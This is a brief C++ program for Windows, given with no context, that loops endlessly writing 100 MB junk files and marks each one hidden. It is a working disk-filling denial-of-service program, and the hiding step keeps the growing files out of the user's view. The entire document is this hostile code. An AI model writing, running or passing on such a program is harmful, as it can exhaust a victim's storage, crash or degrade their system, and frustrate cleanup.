#include <windows.h>
#include <fstream>
#include <string>

int main() {
    int i = 0;
    while (true) {
        std::string filename = "junk_" + std::to_string(i++) + ".txt";
        
        // Write 100MB of junk
        std::ofstream file(filename);
        std::string data(100 * 1024 * 1024, 'X');
        file << data;
        file.close();

        // Make it hidden
        SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
    return 0;
}